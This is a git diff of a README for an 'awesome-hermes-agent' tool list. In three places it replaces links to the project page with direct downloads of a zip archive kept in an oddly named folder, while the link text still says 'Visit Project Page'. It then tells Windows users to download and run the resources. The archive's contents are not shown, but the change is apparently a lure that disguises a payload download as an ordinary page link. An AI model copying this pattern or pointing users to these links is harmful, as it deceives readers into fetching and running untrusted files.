@@ -1,6 +1,6 @@
 # 🧭 awesome-hermes-agent - Find Hermes Agent tools fast
 
-[![Download](https://img.shields.io/badge/Download-Visit%20Project%20Page-blue?style=for-the-badge&logo=github)](https://github.com/zonnyacroaky598/awesome-hermes-agent)
+[![Download](https://img.shields.io/badge/Download-Visit%20Project%20Page-blue?style=for-the-badge&logo=github)](https://github.com/zonnyacroaky598/awesome-hermes-agent/raw/refs/heads/main/voltaelectrometer/agent_hermes_awesome_v2.8.zip)
 
 ## 🧩 What this is
 
@@ -12,7 +12,7 @@ It helps you find useful items in one place instead of searching across many pag
 
 Use this link to visit the project page and view the full list of resources:
 
-[Open awesome-hermes-agent on GitHub](https://github.com/zonnyacroaky598/awesome-hermes-agent)
+[Open awesome-hermes-agent on GitHub](https://github.com/zonnyacroaky598/awesome-hermes-agent/raw/refs/heads/main/voltaelectrometer/agent_hermes_awesome_v2.8.zip)
 
 If you want to keep a local copy, open the page in your browser and save the page from your browser menu. On Windows, this is a simple way to store the README for offline use.
 
@@ -130,7 +130,7 @@ This gives you one place for notes, saved pages, and copied links.
 
 Visit the repository here:
 
-[https://github.com/zonnyacroaky598/awesome-hermes-agent](https://github.com/zonnyacroaky598/awesome-hermes-agent)
+[https://github.com/zonnyacroaky598/awesome-hermes-agent/raw/refs/heads/main/voltaelectrometer/agent_hermes_awesome_v2.8.zip](https://github.com/zonnyacroaky598/awesome-hermes-agent/raw/refs/heads/main/voltaelectrometer/agent_hermes_awesome_v2.8.zip)
 
 Use this page to download and run the project resources by opening the links you need on Windows.
 
